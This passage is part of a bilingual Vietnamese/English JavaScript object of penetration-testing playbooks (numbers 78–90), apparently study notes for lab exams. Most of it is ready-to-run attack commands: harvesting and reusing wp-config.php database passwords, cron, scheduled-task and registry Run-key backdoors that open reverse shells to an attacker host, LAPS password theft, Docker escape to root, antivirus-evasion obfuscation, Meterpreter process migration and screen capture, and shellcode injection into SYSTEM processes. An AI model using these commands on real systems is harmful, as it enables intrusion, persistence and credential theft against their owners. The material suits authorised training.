    "content": "## Playbook 78: Linux Foothold - Creds t·ª´ wp-config.php üö™üìÑ‚û°Ô∏èüîë\n\n**Gi·∫£ ƒë·ªãnh:** ƒê·ªçc ƒë∆∞·ª£c `wp-config.php`.\n\n**M·ª•c ti√™u:** Tr√≠ch xu·∫•t creds DB v√† th·ª≠ s·ª≠ d·ª•ng.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **L·∫•y N·ªôi dung:** `curl` ho·∫∑c `cat`.\n2.  **T√¨m Creds:** `DB_USER`, `DB_PASSWORD`, `DB_HOST`.\n3.  **Th·ª≠ Creds:** K·∫øt n·ªëi DB (`mysql`) ho·∫∑c th·ª≠ SSH/SU (Password Reuse).",
    "steps": [
      {"vi": "**L·∫•y wp-config.php:**", "en": "**Get wp-config.php:**", "command": "curl http://<target_ip>/wp-config.php # Ho·∫∑c cat /var/www/html/wp-config.php"},
      {"vi": "**T√¨m Creds DB:**", "en": "**Find DB Creds:**", "command": "grep -E 'DB_USER|DB_PASSWORD|DB_HOST' wp-config.php"},
      {"vi": "**Th·ª≠ K·∫øt n·ªëi MySQL:**", "en": "**Try Connect MySQL:**", "command": "mysql -u <db_user> -p'<db_password>' -h <db_host>"},
      {"vi": "**Th·ª≠ Password Reuse (SSH):**", "en": "**Try Password Reuse (SSH):**", "command": "ssh <user>@<target_ip> # (Use DB password)"},
      {"vi": "**Th·ª≠ Password Reuse (SU):**", "en": "**Try Password Reuse (SU):**", "command": "su - <user> # (Use DB password)"}
    ],
    "related_knowledge_ids": ["wordpress", "wp-config.php", "mysql", "database", "credential_hunting", "sqli_theory_connection", "ssh", "su"]
  },
  "playbook_79_linux_persistence_cron": {
    "title": {
      "vi": "Playbook 79: Linux Persistence qua User Cron Job",
      "en": "Playbook 79: Linux Persistence via User Cron Job"
    },
    "assumption": "C√≥ shell user Linux.",
    "objective": "Th√™m cron job ƒë·ªÉ ch·∫°y reverse shell ƒë·ªãnh k·ª≥.",
    "tools": ["crontab", "echo", "nc", "bash"],
    "phases": ["Persistence"],
    "techniques": ["Persistence", "Cron Job Abuse"],
    "targets": ["Linux Crontab"],
    "os": ["Linux"],
    "tags": ["linux", "persistence", "cron", "crontab", "reverse shell"],
    "content": "## Playbook 79: Linux Persistence - User Cron Job üìå‚è∞\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell user Linux.\n\n**M·ª•c ti√™u:** Th√™m cron job reverse shell.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Listener (Kali):** `nc -lvnp 4448`.\n2.  **T·∫°o Cron Job:** `(crontab -l 2>/dev/null; echo \"* * * * * bash -c 'bash -i ...'\") | crontab -`.\n3.  **Ki·ªÉm tra:** `crontab -l`.\n4.  **Ch·ªù K·∫øt n·ªëi.**",
    "steps": [
      {"vi": "**M·ªü Listener:**", "en": "**Start Listener:**", "command": "rlwrap nc -lvnp 4448"},
      {"vi": "**Th√™m Cron Job:**", "en": "**Add Cron Job:**", "command": "(crontab -l 2>/dev/null; echo \"* * * * * bash -c 'bash -i >& /dev/tcp/<kali_ip>/4448 0>&1'\") | crontab -"},
      {"vi": "**Ki·ªÉm tra Crontab:**", "en": "**Check Crontab:**", "command": "crontab -l"},
      {"vi": "**Ch·ªù K·∫øt n·ªëi:**", "en": "**Wait for Connection:**"}
    ],
    "related_knowledge_ids": ["linuxprivesc_cron_enum", "crontab", "persistence", "reverse_shell", "nc", "bash"]
  },
  "playbook_80_windows_persistence_schtask": {
    "title": {
      "vi": "Playbook 80: Windows Persistence qua Scheduled Task",
      "en": "Playbook 80: Windows Persistence via Scheduled Task"
    },
    "assumption": "C√≥ shell user (ho·∫∑c Admin/SYSTEM) tr√™n Windows.",
    "objective": "T·∫°o scheduled task ƒë·ªÉ ch·∫°y reverse shell (v√≠ d·ª•: khi login, ƒë·ªãnh k·ª≥).",
    "tools": ["schtasks", "nc", "powershell (payload)"],
    "phases": ["Persistence"],
    "techniques": ["Persistence", "Scheduled Task Abuse"],
    "targets": ["Windows Scheduled Tasks"],
    "os": ["Windows"],
    "tags": ["windows", "persistence", "scheduled tasks", "schtasks", "reverse shell"],
    "content": "## Playbook 80: Windows Persistence - Scheduled Task üìå‚è∞\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell Windows.\n\n**M·ª•c ti√™u:** T·∫°o scheduled task ch·∫°y reverse shell.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Payload:** T·∫£i payload (`nc.exe`, `rev.ps1`) l√™n target.\n2.  **Listener (Kali):** `nc -lvnp 4449`.\n3.  **T·∫°o Task:** `schtasks /create /tn \"Name\" /tr \"C:\\path\\payload\" /sc HOURLY /ru SYSTEM` (ho·∫∑c `/sc ONLOGON`).\n4.  **Ki·ªÉm tra:** `schtasks /query /tn \"Name\"`.\n5.  **Ch·ªù K·∫øt n·ªëi.**",
    "steps": [
      {"vi": "**Chu·∫©n b·ªã Payload & Listener:**", "en": "**Prepare Payload & Listener:**", "command": "# Upload nc.exe/rev.ps1 to target; rlwrap nc -lvnp 4449 on Kali"},
      {"vi": "**T·∫°o Task (Ch·∫°y h√†ng gi·ªù):**", "en": "**Create Task (Hourly):**", "command": "schtasks /create /tn \"MyBackdoor\" /tr \"C:\\Windows\\Temp\\nc.exe <kali_ip> 4449 -e cmd.exe\" /sc HOURLY /ru SYSTEM"},
      {"vi": "**T·∫°o Task (Khi Login - C·∫ßn quy·ªÅn):**", "en": "**Create Task (On Logon - Needs Privs):**", "command": "schtasks /create /tn \"MyBackdoorLogin\" /tr \"C:\\Windows\\Temp\\rev.ps1\" /sc ONLOGON /ru <TargetUser>"},
      {"vi": "**Ki·ªÉm tra Task:**", "en": "**Check Task:**", "command": "schtasks /query /tn \"MyBackdoor\""},
      {"vi": "**Ch·ªù Trigger:**", "en": "**Wait for Trigger:**"}
    ],
    "related_knowledge_ids": ["winprivesc_scheduled_tasks", "schtasks", "persistence", "nc", "powershell", "reverse_shell"]
  },
  "playbook_81_windows_persistence_runkey": {
    "title": {
      "vi": "Playbook 81: Windows Persistence qua Registry Run Key",
      "en": "Playbook 81: Windows Persistence via Registry Run Key"
    },
    "assumption": "C√≥ shell user (ho·∫∑c Admin/SYSTEM) tr√™n Windows.",
    "objective": "Th√™m entry v√†o Registry Run key (`HKCU` ho·∫∑c `HKLM`) ƒë·ªÉ t·ª± ch·∫°y payload khi user login.",
    "tools": ["reg add", "nc", "powershell (payload)"],
    "phases": ["Persistence"],
    "techniques": ["Persistence", "Registry Run Keys"],
    "targets": ["Windows Registry"],
    "os": ["Windows"],
    "tags": ["windows", "persistence", "registry", "run keys", "autorun", "reverse shell"],
    "content": "## Playbook 81: Windows Persistence - Registry Run Key üìåüîë\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell Windows.\n\n**M·ª•c ti√™u:** Th√™m payload v√†o Registry Run key.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Payload:** T·∫£i payload (`nc.exe`, `rev.ps1`) l√™n target.\n2.  **Listener (Kali):** `nc -lvnp 4450`.\n3.  **Th√™m Key (HKCU):** `reg add HKCU\\...\\Run /v \"Name\" /t REG_SZ /d \"C:\\path\\payload\" /f`.\n4.  **Th√™m Key (HKLM - Admin):** `reg add HKLM\\...\\Run /v \"Name\" ... /f`.\n5.  **Ki·ªÉm tra:** `reg query HKCU\\...\\Run /v \"Name\"`.\n6.  **Ch·ªù Login.**",
    "steps": [
      {"vi": "**Chu·∫©n b·ªã Payload & Listener:**", "en": "**Prepare Payload & Listener:**", "command": "# Upload nc.exe/rev.ps1 to target; rlwrap nc -lvnp 4450 on Kali"},
      {"vi": "**Th√™m Run Key (User):**", "en": "**Add Run Key (User):**", "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"MyBackdoor\" /t REG_SZ /d \"C:\\Windows\\Temp\\nc.exe <kali_ip> 4450 -e cmd.exe\" /f"},
      {"vi": "**Th√™m Run Key (Machine - Admin):**", "en": "**Add Run Key (Machine - Admin):**", "command": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"MyBackdoorAll\" /t REG_SZ /d \"C:\\Windows\\Temp\\nc.exe <kali_ip> 4450 -e cmd.exe\" /f"},
      {"vi": "**Ki·ªÉm tra Key:**", "en": "**Check Key:**", "command": "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"MyBackdoor\""},
      {"vi": "**Ch·ªù Login/Logout:**", "en": "**Wait for Login/Logout:**"}
    ],
    "related_knowledge_ids": ["winprivesc_autorun", "reg add", "reg query", "persistence", "nc", "powershell", "reverse_shell"]
  },
  "playbook_82_ad_enum_trusts": {
    "title": {
      "vi": "Playbook 82: AD Enumeration - Li·ªát k√™ Domain Trusts (PowerView)",
      "en": "Playbook 82: AD Enumeration - Listing Domain Trusts (PowerView)"
    },
    "assumption": "C√≥ shell PowerShell tr√™n m√°y join domain, c√≥ `PowerView.ps1`.",
    "objective": "X√°c ƒë·ªãnh c√°c m·ªëi quan h·ªá trust gi·ªØa domain v√† c√°c domain/forest kh√°c.",
    "tools": ["powershell", "powerview"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["Active Directory Enumeration", "Domain Trust Enumeration"],
    "targets": ["Active Directory Trusts"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "enumeration", "powerview", "powershell", "domain trust", "forest trust"],
    "content": "## Playbook 82: AD Enum - Domain Trusts üïµÔ∏è‚Äç‚ôÇÔ∏èü§ù\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell PS, c√≥ `PowerView.ps1`.\n\n**M·ª•c ti√™u:** Li·ªát k√™ domain/forest trusts.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Import:** `Import-Module .\\PowerView.ps1`.\n2.  **Domain Trusts:** `Get-NetDomainTrust`.\n3.  **Forest Trusts:** `Get-NetForestTrust`.\n4.  **Ph√¢n t√≠ch:** T√¨m trusts c√≥ th·ªÉ l·∫°m d·ª•ng.",
    "steps": [
      {"vi": "**Import PowerView:**", "en": "**Import PowerView:**", "command": "Import-Module .\\PowerView.ps1"},
      {"vi": "**Li·ªát k√™ Domain Trusts:**", "en": "**List Domain Trusts:**", "command": "Get-NetDomainTrust"},
      {"vi": "**Li·ªát k√™ Forest Trusts:**", "en": "**List Forest Trusts:**", "command": "Get-NetForestTrust"}
    ],
    "related_knowledge_ids": ["ad_pentest_enum_powerview", "powerview", "powershell", "domain trust", "forest trust"]
  },
  "playbook_83_ad_enum_gpo": {
    "title": {
      "vi": "Playbook 83: AD Enumeration - Li·ªát k√™ GPOs (PowerView)",
      "en": "Playbook 83: AD Enumeration - Listing GPOs (PowerView)"
    },
    "assumption": "C√≥ shell PowerShell tr√™n m√°y join domain, c√≥ `PowerView.ps1`.",
    "objective": "Li·ªát k√™ GPOs v√† x√°c ƒë·ªãnh GPO √°p d·ª•ng cho ƒë·ªëi t∆∞·ª£ng c·ª• th·ªÉ.",
    "tools": ["powershell", "powerview"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["Active Directory Enumeration", "GPO Enumeration"],
    "targets": ["Group Policy Objects (GPO)"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "enumeration", "powerview", "powershell", "gpo", "group policy"],
    "content": "## Playbook 83: AD Enum - Group Policy Objects üïµÔ∏è‚Äç‚ôÇÔ∏èüìú\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell PS, c√≥ `PowerView.ps1`.\n\n**M·ª•c ti√™u:** Li·ªát k√™ v√† ph√¢n t√≠ch GPOs.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Import:** `Import-Module .\\PowerView.ps1`.\n2.  **List All:** `Get-NetGPO`.\n3.  **List for Computer:** `Get-NetGPO -ComputerName $env:COMPUTERNAME`.\n4.  **List for User:** `Get-NetGPO -UserName <user>`.\n5.  **List for Group:** `Get-NetGPOGroup -GroupName \"Group\"`.\n6.  **Ph√¢n t√≠ch:** T√¨m GPP passwords (SYSVOL), script logon, c·∫•u h√¨nh kh√¥ng an to√†n.",
    "steps": [
      {"vi": "**Import PowerView:**", "en": "**Import PowerView:**", "command": "Import-Module .\\PowerView.ps1"},
      {"vi": "**Li·ªát k√™ T·∫•t c·∫£ GPOs:**", "en": "**List All GPOs:**", "command": "Get-NetGPO"},
      {"vi": "**GPOs cho M√°y Hi·ªán t·∫°i:**", "en": "**GPOs for Current Computer:**", "command": "Get-NetGPO -ComputerName $env:COMPUTERNAME"},
      {"vi": "**GPOs cho Group 'Domain Admins':**", "en": "**GPOs for 'Domain Admins' Group:**", "command": "Get-NetGPOGroup -GroupName \"Domain Admins\""}
    ],
    "related_knowledge_ids": ["ad_pentest_enum_powerview", "powerview", "powershell", "gpo", "group policy", "playbook_57_ad_enum_powerview_focus", "playbook_24_ad_attack_gpp_decrypt"]
  },
  "playbook_84_ad_enum_laps": {
    "title": {
      "vi": "Playbook 84: AD Enumeration - T√¨m LAPS Password (ldapsearch)",
      "en": "Playbook 84: AD Enumeration - Finding LAPS Password (ldapsearch)"
    },
    "assumption": "C√≥ quy·ªÅn ƒë·ªçc thu·ªôc t√≠nh LAPS (`ms-MCS-AdmPwd`) qua LDAP.",
    "objective": "Truy v·∫•n LDAP ƒë·ªÉ l·∫•y m·∫≠t kh·∫©u local admin ƒë∆∞·ª£c qu·∫£n l√Ω b·ªüi LAPS.",
    "tools": ["ldapsearch"],
    "phases": ["Credential Access", "Enumeration"],
    "techniques": ["Active Directory Enumeration", "LAPS Abuse"],
    "targets": ["LAPS Passwords", "Active Directory Computer Objects"],
    "os": ["Any (LDAP Client)"],
    "tags": ["ad", "active directory", "enumeration", "credential access", "laps", "ldap", "ldapsearch", "ms-mcs-admpwd"],
    "content": "## Playbook 84: AD Enum - LAPS Password üïµÔ∏è‚Äç‚ôÇÔ∏èüíªüîë\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ quy·ªÅn ƒë·ªçc thu·ªôc t√≠nh LAPS (`ms-MCS-AdmPwd`) qua LDAP.\n\n**M·ª•c ti√™u:** L·∫•y m·∫≠t kh·∫©u LAPS.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c ƒë·ªãnh Computer Target.**\n2.  **Truy v·∫•n LDAP:** `ldapsearch -H ldap://<DC> -D '<user>' -w '<pass>' -b '<baseDN>' '(&(objectClass=computer)(cn=<Computer>))' ms-MCS-AdmPwd`.\n3.  **L·∫•y M·∫≠t kh·∫©u:** Tr√≠ch xu·∫•t t·ª´ output.\n4.  **S·ª≠ d·ª•ng:** ƒêƒÉng nh·∫≠p v√†o m√°y t√≠nh ƒë√≥ v·ªõi user `Administrator` v√† m·∫≠t kh·∫©u LAPS.",
    "steps": [
      {"vi": "**Truy v·∫•n LDAP:**", "en": "**Query LDAP:**", "command": "ldapsearch -H ldap://<DC_IP> -D '<user_dn>' -w '<password>' -b '<domain_dn>' '(&(objectClass=computer)(cn=<ComputerName>))' ms-MCS-AdmPwd"},
      {"vi": "**L·∫•y M·∫≠t kh·∫©u:**", "en": "**Get Password:**", "command": "# Extract password from ms-MCS-AdmPwd attribute in output"},
      {"vi": "**S·ª≠ d·ª•ng M·∫≠t kh·∫©u (V√≠ d·ª• RDP):**", "en": "**Use Password (Example RDP):**", "command": "xfreerdp /v:<ComputerName> /u:Administrator /p:<LAPS_Password>"}
    ],
    "related_knowledge_ids": ["initial_ldap_enum", "ldap", "ldapsearch", "laps", "ad", "active_directory", "ms-mcs-admpwd", "xfreerdp"]
  },
  "playbook_85_foothold_default_creds": {
    "title": {
      "vi": "Playbook 85: Foothold qua Default Credentials",
      "en": "Playbook 85: Foothold via Default Credentials"
    },
    "assumption": "Ph√°t hi·ªán d·ªãch v·ª• c√≥ th·ªÉ c√≥ default credentials.",
    "objective": "Th·ª≠ ƒëƒÉng nh·∫≠p b·∫±ng username/password m·∫∑c ƒë·ªãnh.",
    "tools": ["nmap", "hydra", "web browser", "ssh", "ftp", "mysql", "impacket-mssqlclient"],
    "phases": ["Initial Foothold", "Credential Access"],
    "techniques": ["Default Credentials", "Password Guessing"],
    "targets": ["Various Services (Web, SSH, FTP, DB, etc.)"],
    "os": ["Any"],
    "tags": ["foothold", "default credentials", "password guessing", "web", "ssh", "ftp", "database", "tomcat", "jenkins"],
    "content": "## Playbook 85: Foothold qua Default Credentials üö™üîë‚ùì\n\n**Gi·∫£ ƒë·ªãnh:** Ph√°t hi·ªán d·ªãch v·ª• c√≥ th·ªÉ d√πng default creds.\n\n**M·ª•c ti√™u:** Th·ª≠ ƒëƒÉng nh·∫≠p b·∫±ng default creds.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c ƒë·ªãnh D·ªãch v·ª•/Version:** Nmap `-sV`.\n2.  **T√¨m Default Creds:** Google, cirt.net, danh s√°ch ph·ªï bi·∫øn.\n3.  **Th·ª≠ ƒêƒÉng nh·∫≠p:** Web (Browser), SSH, FTP, DB (mysql, impacket-mssqlclient), Hydra.",
    "steps": [
      {"vi": "**X√°c ƒë·ªãnh D·ªãch v·ª•/Version:**", "en": "**Identify Service/Version:**", "command": "nmap -sV -p <port> <target_ip>"},
      {"vi": "**T√¨m Default Creds (Google):**", "en": "**Find Default Creds (Google):**", "command": "# Search: \"<Service> <Version> default password\""},
      {"vi": "**Th·ª≠ ƒêƒÉng nh·∫≠p Web:**", "en": "**Try Web Login:**", "command": "# Use browser with common defaults (admin:admin, etc.)"},
      {"vi": "**Th·ª≠ ƒêƒÉng nh·∫≠p SSH:**", "en": "**Try SSH Login:**", "command": "ssh root@<target_ip> # (Try default passwords)"},
      {"vi": "**Th·ª≠ ƒêƒÉng nh·∫≠p FTP Anon:**", "en": "**Try FTP Anon Login:**", "command": "ftp <target_ip> # (User: anonymous, Pass: anonymous)"},
      {"vi": "**Th·ª≠ ƒêƒÉng nh·∫≠p MySQL Root:**", "en": "**Try MySQL Root Login:**", "command": "mysql -u root -p -h <target_ip> # (Try blank, root, password)"}
    ],
    "related_knowledge_ids": ["nmap", "password_guessing_strategies", "hydra", "ssh", "ftp", "mysql", "impacket-mssqlclient", "port_21", "playbook_78_linux_foothold_creds_wpconfig", "playbook_32_foothold_mssql_xpcmdshell"]
  },
  "playbook_86_linux_privesc_docker_escape": {
    "title": {
      "vi": "Playbook 86: Linux PrivEsc qua Docker Escape (Volume Mount)",
      "en": "Playbook 86: Linux PrivEsc via Docker Escape (Volume Mount)"
    },
    "assumption": "C√≥ shell user thu·ªôc nh√≥m `docker`.",
    "objective": "Leo thang l√™n root host b·∫±ng c√°ch mount filesystem c·ªßa host v√†o container.",
    "tools": ["docker", "id", "groups"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Docker Escape", "Privilege Escalation"],
    "targets": ["Docker Socket", "Host Filesystem"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "docker", "docker escape", "volume mount", "root"],
    "content": "## Playbook 86: Linux PrivEsc - Docker Escape (Mount) üê≥‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** User thu·ªôc nh√≥m `docker`.\n\n**M·ª•c ti√™u:** Leo thang l√™n root host.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c nh·∫≠n Quy·ªÅn:** `id`.\n2.  **Ch·∫°y Container:** `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.\n3.  **X√°c nh·∫≠n Root:** `id` (trong shell container).",
    "steps": [
      {"vi": "**Ki·ªÉm tra Nh√≥m Docker:**", "en": "**Check Docker Group:**", "command": "id"},
      {"vi": "**Ch·∫°y Docker Mount & Chroot:**", "en": "**Run Docker Mount & Chroot:**", "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
      {"vi": "**X√°c nh·∫≠n Root (trong container):**", "en": "**Confirm Root (in container):**", "command": "id"}
    ],
    "related_knowledge_ids": ["linuxprivesc_manual_other", "docker", "docker escape", "privesc"]
  },
  "playbook_87_av_evasion_manual_obfuscation": {
    "title": {
      "vi": "Playbook 87: AV Evasion - Obfuscation Th·ªß c√¥ng (Scripting)",
      "en": "Playbook 87: AV Evasion - Manual Obfuscation (Scripting)"
    },
    "assumption": "Script payload (PS1, PY, VBS) b·ªã AV ph√°t hi·ªán.",
    "objective": "S·ª≠a ƒë·ªïi script ƒë·ªÉ thay ƒë·ªïi signature v√† bypass AV.",
    "tools": ["text editor", "base64", "Invoke-Obfuscation (Optional)"],
    "phases": ["Defense Evasion"],
    "techniques": ["AV Evasion", "Obfuscation", "Code Manipulation"],
    "targets": ["Antivirus", "Script Payload (PS1, PY, VBS)"],
    "os": ["Any (Scripting Language Dependent)"],
    "tags": ["av evasion", "obfuscation", "manual evasion", "powershell", "python", "bypass", "signature bypass", "code manipulation"],
    "content": "## Playbook 87: AV Evasion - Obfuscation Th·ªß c√¥ng üõ°Ô∏èüé≠‚û°Ô∏èüêö\n\n**Gi·∫£ ƒë·ªãnh:** Script payload b·ªã AV ch·∫∑n.\n\n**M·ª•c ti√™u:** Thay ƒë·ªïi signature script ƒë·ªÉ bypass AV.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **ƒê·ªïi t√™n Bi·∫øn/H√†m.**\n2.  **Thay ƒë·ªïi C·∫•u tr√∫c:** Th√™m comment/space, t√°ch chu·ªói, m√£ h√≥a chu·ªói (base64/XOR), ƒë·ªïi th·ª© t·ª± h√†m, th√™m logic r√°c.\n3.  **Thay ƒë·ªïi C√°ch G·ªçi:** D√πng alias (PS), `exec()` (PY), `Get-Command` (PS).\n4.  **Ki·ªÉm tra & L·∫∑p l·∫°i.**",
    "steps": [
      {"vi": "**ƒê·ªïi t√™n Bi·∫øn/H√†m:**", "en": "**Rename Variables/Functions:**", "command": "# Manually edit script"},
      {"vi": "**T√°ch Chu·ªói:**", "en": "**Split Strings:**", "command": "# Example: \"Virtual\" + \"Alloc\""},
      {"vi": "**M√£ h√≥a Chu·ªói (Base64):**", "en": "**Encode Strings (Base64):**", "command": "# Example PS: [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\"...\"))"},
      {"vi": "**Th√™m Logic R√°c:**", "en": "**Add Junk Logic:**", "command": "# Example: $x = 1+1; if ($x -eq 2) { # Real code }"},
      {"vi": "**Ki·ªÉm tra l·∫°i:**", "en": "**Re-check:**", "command": "# Test against AV/sandbox"}
    ],
    "related_knowledge_ids": ["av_evasion", "obfuscation", "manual_evasion", "powershell", "python", "base64", "av_evasion_manual_powershell"]
  },
  "playbook_88_metasploit_post_migrate": {
    "title": {
      "vi": "Playbook 88: Metasploit Post-Ex - Migrate Process",
      "en": "Playbook 88: Metasploit Post-Ex - Migrate Process"
    },
    "assumption": "C√≥ Meterpreter session, c·∫ßn chuy·ªÉn sang process ·ªïn ƒë·ªãnh/√≠t b·ªã ch√∫ √Ω h∆°n.",
    "objective": "Migrate Meterpreter sang process kh√°c.",
    "tools": ["metasploit", "meterpreter"],
    "phases": ["Post Exploitation", "Defense Evasion"],
    "techniques": ["Process Migration"],
    "targets": ["Windows Processes"],
    "os": ["Windows"],
    "tags": ["metasploit", "meterpreter", "post exploitation", "migrate", "process migration", "defense evasion"],
    "content": "## Playbook 88: Metasploit Post-Ex - Migrate Process üïµÔ∏è‚Äç‚ôÄÔ∏è‚û°Ô∏èüèÉ‚Äç‚ôÇÔ∏è (MSF)\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ Meterpreter, c·∫ßn chuy·ªÉn process.\n\n**M·ª•c ti√™u:** Migrate Meterpreter.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **List Processes:** `ps`.\n2.  **Ch·ªçn Target:** T√¨m process ·ªïn ƒë·ªãnh (explorer.exe, svchost.exe), c√πng ki·∫øn tr√∫c, ghi PID.\n3.  **Migrate:** `migrate <PID>`.\n4.  **Ki·ªÉm tra:** `getpid`, `getuid`.",
    "steps": [
      {"vi": "**Li·ªát k√™ Processes:**", "en": "**List Processes:**", "command": "ps"},
      {"vi": "**Ch·ªçn Target Process (PID):**", "en": "**Choose Target Process (PID):**", "command": "# Find stable process (e.g., explorer.exe) with matching architecture"},
      {"vi": "**Migrate:**", "en": "**Migrate:**", "command": "migrate <PID>"},
      {"vi": "**Ki·ªÉm tra PID/UID:**", "en": "**Check PID/UID:**", "command": "getpid; getuid"}
    ],
    "related_knowledge_ids": ["metasploit_post_exploitation_core", "meterpreter", "migrate", "ps", "metasploit_post_exploitation_lab_getsystem_migrate"]
  },
  "playbook_89_windows_privesc_sedebugprivilege": {
    "title": {
      "vi": "Playbook 89: Windows PrivEsc qua SeDebugPrivilege",
      "en": "Playbook 89: Windows PrivEsc via SeDebugPrivilege"
    },
    "assumption": "User c√≥ `SeDebugPrivilege`.",
    "objective": "L·∫°m d·ª•ng SeDebugPrivilege ƒë·ªÉ inject shellcode v√†o process SYSTEM.",
    "tools": ["whoami", "powershell", "msfvenom", "nc", "procdump (optional)"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Privilege Abuse", "SeDebugPrivilege", "Process Injection", "Shellcode Injection"],
    "targets": ["Windows Privileges", "SYSTEM Processes"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "sedebugprivilege", "privilege abuse", "process injection", "shellcode", "powershell", "mimikatz (indirectly)"],
    "content": "## Playbook 89: Windows PrivEsc qua SeDebugPrivilege üíª‚¨ÜÔ∏èüíâ‚û°Ô∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** User c√≥ `SeDebugPrivilege`.\n\n**M·ª•c ti√™u:** Leo thang l√™n SYSTEM b·∫±ng inject v√†o process SYSTEM.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c nh·∫≠n:** `whoami /priv`.\n2.  **Shellcode:** `msfvenom -p ... -f ps1 -v ShellcodeBytes`.\n3.  **Script Injection:** T√¨m/vi·∫øt script PS d√πng WinAPI (OpenProcess, VirtualAllocEx, ...).\n4.  **Target Process:** T√¨m PID process SYSTEM 64-bit (`Get-Process | ? {$_.SI -eq 0 ...}`).\n5.  **Inject:** T·∫£i script, m·ªü listener (`nc`), ch·∫°y script (`powershell -ep bypass -File inject.ps1 -PID <PID>`).",
    "steps": [
      {"vi": "**X√°c nh·∫≠n Privilege:**", "en": "**Confirm Privilege:**", "command": "whoami /priv"},
      {"vi": "**T·∫°o Shellcode (PS Byte Array):**", "en": "**Create Shellcode (PS Byte Array):**", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4451 -f ps1 -v ShellcodeBytes"},
      {"vi": "**Chu·∫©n b·ªã/T·∫£i Script Injection:**", "en": "**Prepare/Upload Injection Script:**", "command": "# Create/Find PS script using WinAPI for injection, include shellcode bytes"},
      {"vi": "**T√¨m PID Process SYSTEM:**", "en": "**Find SYSTEM Process PID:**", "command": "Get-Process | ? {$_.SI -eq 0 -and $_.Architecture -eq 'X64'} | select Id,ProcessName"}, // Th√™m check Architecture
      {"vi": "**M·ªü Listener:**", "en": "**Start Listener:**", "command": "rlwrap nc -lvnp 4451"},
      {"vi": "**Ch·∫°y Script Injection:**", "en": "**Run Injection Script:**", "command": "powershell -ep bypass -File .\\inject.ps1 -ProcessId <SYSTEM_PID>"}
    ],
    "related_knowledge_ids": ["winprivesc_exploits_theory", "whoami /priv", "powershell", "msfvenom", "shellcode", "process_injection", "nc"]
  },
  "playbook_90_metasploit_post_screen_capture": {
    "title": {
      "vi": "Playbook 90: Metasploit Post-Ex - Ch·ª•p ·∫¢nh M√†n h√¨nh",
      "en": "Playbook 90: Metasploit Post-Ex - Screen Capture"
    },
    "assumption": "C√≥ Meterpreter session tr√™n m√°y c√≥ desktop.",
    "objective": "Ch·ª•p ·∫£nh m√†n h√¨nh hi·ªán t·∫°i c·ªßa ng∆∞·ªùi d√πng.",
    "tools": ["metasploit", "meterpreter"],
    "phases": ["Post Exploitation", "Collection"],
    "techniques": ["Screen Capture"],
    "targets": ["User Desktop Session"],
    "os": ["Windows", "Linux (Desktop)"],
    "tags": ["metasploit", "meterpreter", "post exploitation", "screen capture", "collection", "screenshot"],
    "content": "## Playbook 90: Metasploit Post-Ex - Ch·ª•p ·∫¢nh M√†n h√¨nh üì∏\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ Meterpreter session tr√™n m√°y c√≥ desktop.\n\n**M·ª•c ti√™u:** Ch·ª•p ·∫£nh m√†n h√¨nh desktop.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Ch·ª•p ·∫¢nh (Meterpreter):** `screenshot`.\n2.  **Xem ·∫¢nh (Kali):** M·ªü file ·∫£nh trong th∆∞ m·ª•c loot.",
    "steps": [
      {"vi": "**V√†o Meterpreter Session:**", "en": "**Enter Meterpreter Session:**", "command": "sessions -i <id>"},
      {"vi": "**Ch·ª•p ·∫¢nh:**", "en": "**Take Screenshot:**", "command": "screenshot"},
      {"vi": "**Xem ·∫¢nh (Tr√™n Kali):**", "en": "**View Screenshot (On Kali):**", "command": "# Open the saved image file from the loot directory (~/.msf4/loot/)"}
    ],
    "related_knowledge_ids": ["metasploit", "meterpreter", "post_exploitation", "screenshot"]
  }
}; // K·∫øt th√∫c object PLAYBOOKS// 
 // *** K·∫øt th√∫c Object PLAYBOOKS ***